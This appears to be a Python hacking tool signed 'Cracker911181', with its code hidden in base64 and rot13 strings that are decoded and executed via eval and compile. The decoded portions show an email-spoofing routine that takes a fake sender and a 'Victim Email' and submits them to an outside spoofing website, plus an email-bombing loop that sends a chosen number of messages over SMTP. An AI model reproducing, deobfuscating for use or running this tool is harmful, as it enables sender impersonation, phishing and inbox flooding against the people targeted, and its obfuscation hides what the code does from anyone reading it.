# Coded by Cacker911181
# CRACKER911181

import base64, codecs
magic = 'CmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZSxvcyxzeXMKaW1wb3J0IHNtdHBsaWIKZnJvbSBnZXRwYXNzIGltcG9ydCBnZXRwYXNzCmZyb20gZW1haWwubWltZS50ZXh0IGltcG9ydCBNSU1FVGV4dApmcm9tIGVtYWlsLm1pbWUubXVsdGlwYXJ0IGltcG9ydCBNSU1FTXVsdGlwYXJ0CgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgoKZGVmIHNwb2ZFbWFpbCgpOgoJb3Muc3lzdGVtKCJjbGVhciIpCgl0cnk6CgkJCgkJZnJvbU5hbWU9c3RyKGlucHV0KHJvc3krIlxuXG5FbnRlciBTZW5kZXIgTmFtZTogIitjb2xvdXJvZmYpKQoJCWZyb21FbWFpbD1zdHIoaW5wdXQocm9zeSsiRW50ZXIgU2VuZGVyIEVtYWlsOiAiK2NvbG91cm9mZikpCgkJdG9FbWFpbD1zdHIoaW5wdXQocm9zeSsiRW50ZXIgVmljdGltIEVtYWlsOiAiK2NvbG91cm9mZikpCgkJU3ViamVjdD1zdHIoaW5wdXQocm9zeSsiRW50ZXIgTWFpbCBTdWJqZWN0OiAiK2NvbG91cm9mZikpCgkJYm9keT1zdHIoaW5wdXQocm9zeSsiRW50ZXIgWW91ciBNZXNzYWdlOiAiK2NvbG91cm9mZikpCgkJCgkJZGF0YT0iZnJvbW5hbWU9Iitmcm9tTmFtZSsiJmZyb21lbWFpbD0iK2Zyb21FbWFpbCsiJnRvZW1haWw9Iit0b0VtYWlsKyImc3ViamVjdD0iK1N1YmplY3QrIiZ0ZXh0YXJlYT0iK2JvZHkrIiZTdWJtaXQ9U2VuZCIKCQkKCQl1cmw9Imh0dHBzOi8vd3d3LmVtYWlsLXNwb29mZXIubWwiCgkJCgkJaGVhZGVyPXsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBTTS1KMzMwRiBCdWlsZC9QUFIxLjE4MDYxMC4wMTE7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlI'
love = 'RqyL2giXFOJMKWmnJ9hYmDhZPOQnUWioJHiBGLhZP40AwL0YwRjAPOAo2WcoTHtH2SzLKWcYmHmAl4mAvVfVxSwL2IjqP1ZLJ5aqJSaMFV6VzIhYHqPYTIhYIIGB3R9ZP45YTIhB3R9ZP44Va0XPDxXPDxwrQ1lMKS1MKA0pl5jo3A0XUIloPkxLKEuCJEuqTRfnTIuMTIlpm1bMJSxMKVcYaEyrUDXPDxXPDyjpzyhqPuapzIyovfvKT5povNtVPNtVPNtVPNtVPOSoJScoPOGqJAwMKAmMaIfoUxtH2IhMPVcPtxWnJ5jqKDbLzk1MFfvKT5povNtVPNtVPODpzImplOSoaEypvOHolOPLJAeVSOlMKMco3ImVR1yoaHtVvxXPDxXPJI4L2IjqPOlMKS1MKA0pl5yrTAypUEco25mYxAioz5yL3Eco25SpaWipwbXPDyjpzyhqPulMJDeVykhKT4tVPNtVPNtVPNtD2uyL2ftJJ91pvOWoaEypz5yqPOQo25hMJA0nJ9hVvxXPDycoaO1qPuvoUIyXlWpoykhVPNtVPNtVPODpzImplOSoaEypvOHolOPLJAeVSOlMKMco3ImVR1yoaHtVvxXPDxXPJI4L2IjqQbXPDyjpzyhqPulMJDeVykhKT4tVPNtVPNtVPNtVPNtH29gMKEbnJ5aVSqyoaDtI3WiozpvXDbWPJyhpUI0XTWfqJHeVykhKT4tVPNtVPNtHUWyp3ZtEJ50MKVtIT8tDzSwnlODpzI2nJ91plOAMJ51VPVcPtbXPtbXPtcxMJLtMJ1unJkPo21vnJ5aXPx6PtxXPJAlLJAeMKV9p210pTkcLv5GGIEDXPWmoKEjYzqgLJyfYzAioFVfVwH4AlVcPtywpzSwn2IlYzIboT8bXDbWL3WuL2gypv5mqTSlqUEfpltcPtxXPDbWPtxXPKOlnJ50XUOyp3DeVykhKT4tVPNtVPNtVPNtVPNtVRkiM2yhVSyiqKVtE21unJjtDJExpzImplVcPtxXPDbWMaWioHIgLJyfCKA0pvucoaO1qPulo3A5XlWpoykhEJ50MKVtJJ91pvOUoJScoPOOMTElMKAmBvNvXFxXPDbWpUqxCKA0pvuaMKEjLKAmXUWip3xeVykhEJ50MKVtJJ91pvOUoJScoPODLKAmq29lMQbtVvxcPtxXPDbWqUW5BtbWPJAlLJAeMKVhoT9anJ4bMaWioHIgLJyfYUO3MPxXPDyipl5mrKA0MJ0bVzAfMJSlVvxXPDxXPDyjpzyhqPujMKA0XlWpoykhVPNtVPNtVPNtVPNtVPNtVPNtGT9anJ4tH3IwL2Imp2M1oTjvXDbWPDbWPKEiEJ1unJj9p3ElXTyhpUI0XUWip3xeVykhKT5SoaEypvOJnJA0nJ0tEJ1unJj6VPVepzIxXF'
god = 'kKCQlzdWJqZWN0PXN0cihpbnB1dChyb3N5KyJcbkVudGVyIEVtYWlsIFN1YmplY3Q6ICIrcmVkKSkKCQlib2R5PSBzdHIoaW5wdXQocm9zeSsiXG5FbnRlciBZb3VyIE1lc3NhZ2U6ICIrY29sb3Vyb2ZmKSkKCQlhbW91bnQ9IHN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgQW1vdW50OiAiK3JlZCkpCgkJCgkJbXNnID0gTUlNRU11bHRpcGFydCgpCgkJbXNnWydGcm9tJ10gPSBmcm9tRW1haWwKCQltc2dbJ1RvJ10gPSB0b0VtYWlsCgkJbXNnWydTdWJqZWN0J10gPSBzdWJqZWN0CgkJYm9keT1ib2R5CgkKCQltc2cuYXR0YWNoKE1JTUVUZXh0KGJvZHksICdwbGFpbicpKQoJCXRleHQgPSBtc2cuYXNfc3RyaW5nKCkKCQkKCQlwcmludCgiXG5cbiIpCgkJaWYgYW1vdW50PT0iIjoKCQkJYW1vdW50PTAKCQlmb3IgaSBpbiByYW5nZShpbnQoYW1vdW50KSk6CgkJCXRyeToKCQkJCWNyYWNrZXIuc2VuZG1haWwoZnJvbUVtYWlsLHRvRW1haWwsdGV4dCkKCQkJCXByaW50KGdyZWVuKyJcdFx0RW1haWwgU2VuZCBTdWNjZXNzZnVsbCAhIikKCQkJIwkKCQkJZXhjZXB0OgoJCQkJcHJpbnQocmVkKyJcdFx0RW1haWwgTm90IFNlbmQhIikKCQoJCgkJCgkJaW5wdXQoYmx1ZSsiXG5cbiAgICAgICBQcmVzcyBFbnRlciBUbyBCYWNrIFByZXZpb3VzIE1lbnUgIikKCQkKCWV4Y2VwdCBzbXRwbGliLlNNVFBBdXRoZW50aWNhdGlvbkVycm9yOgoJCXByaW50KHJlZCsiXG5cbiAgICAgICAgICAgICBQYXNzd29yZCBJbmNvcnJlY3Qgb3JcbiAgICBMZXNzIFNlY3VpcmUgQXBwIEFjY2VzcyBpcyB0dXJuZWQgb2ZmIikKCQlpbnB1dChibHVlKyJcblxuICAgICAgIFByZXNzIEVudGVyIFRvIEJhY2sgUHJldmlvdXMgTWVudSAiKQoJCQoJZXhjZXB0IFR5cGVFcnJvcjoJCgkJcHJpbnQocmVkKyJcblxuICAgICAgICBFbWFpbCBvciBQYXNzd29yZCBGaWVsZCBhcmUgRW1wdHkiKQoJCWlucHV0KGJsdWUrIlxuXG4gICAgICAgUHJlc3MgRW50ZXIgVG8gQmFjayBQcmV2aW91cyBNZW51ICIpCgkKCWV4Y2VwdDoKCQlwcmludChyZWQrIlxuXG4gICAgICAgICAgICAgIFNvbWV0aGluZyBXZW50IFdyb25nIik'
destiny = 'XPDycoaO1qPuvoUIyXlWpoykhVPNtVPNtVSOlMKAmVRIhqTIlVSEiVRWuL2ftHUWyqzyiqKZtGJIhqFNvXDbWPDbWPtxXPtbXPtbXPaqbnJkyVSElqJH6Ptyipl5mrKA0MJ0bW2AfMJSlWlxXPKOlnJ50XTWfqJHeMvVvVtbtVPOsK19sVPNtVPNtVPNtVPNtVPNtVS8tVPNtVPNtVPNtVPNtVPNtK19sK18tVPNtVPNtVPNtVS8XVPNiVS9sK3ksVS9sVS9sVS8tVS9sK3jtsPOsK19sKlOsVS9sVPNtsS8tVPOssS9sVPNtK19sVUjtsNbtVvVvX2WfqJHeVvVvsPO8VPNtsPNaK18iVS9tVUjiVS9ssPO8YlNiVS8tKPNaK198K19sK3jtsP8tKlOpVP8tKlOpsPO8PvNvVvVepTImqPfvVvW8VUksK198VUjtsPNbK3jtsPNbK198VPNtCPNtK18iVUjtsS9sK19ssPO8VPusXFO8VPusXFO8VUjXVPOpK19sK3kssPNtKS9sYS98KS9sK3kssSksKS9sK3kssPNtVPNtVPO8K3kpK19sYlOpK19sY3kssSkhKT4tVvVvX2qlMJIhXlVvVvNtVPNtVPNtVPNtVPOQpzSwnlOMo3IlVSqipzkxYPOWMvOMo3HtD2ShKT5poyk0VPNtVPNtVPNtVPVvVvgvoUIyXlVvVyivzVIqVRIgLJyfVSEio2jtJ+XLuI0tKT4vVvVeM3WyMJ4eVvVvVQ09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CFVvVvgwo2kiqKWiMzLcPtxXPtywnT9mMG1mqUVbnJ5jqKDbpTImqPfvKT5pqSk0ZF4tEJ1unJjtDz9gLzyhM1khKUEpqQVhVRIgLJyfVSAjo2Mcozqpoyk0KUDvX3WyMPfvZQNhVRWuL2ftIT8tFT9gMFVepz9mrFfvKT5poxIhqTIlVSyiqKVtG3O0nJ9hBvNvXFxXPDbWPtycMvOwnT9mMG09VwRvBtbWPKElrGbXPDxWo3Zhp3ymqTIgXPWwoTIupvVcPtxWPJIgLJyfDz9gLzyhMltcPtxWMKuwMKO0BtbWPDyjpzyhqPulMJDeVykhKT4tVPNtVPNtVPNtVPNtVRAbMJAeVSyiqKVtFJ50MKWhMKDtD29hozIwqTyiovVcPtxWPJyhpUI0XTWfqJHeVykhKT4tVPNtVPNtHUWyp3ZtEJ50MKVtIT8tDzSwnlODpzI2nJ91plOAMJ51VPVcPtxWPtyyoTyzVTAbo3AyCG0vZvV6PtxWqUW5BtbWPDympT9zEJ1unJjbXDbWPJI4L2IjqQbXPDxWpTSmpjbWPtyyoTyzVTAbo3AyCG0vZQNvBtbWPJWlMJSe'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))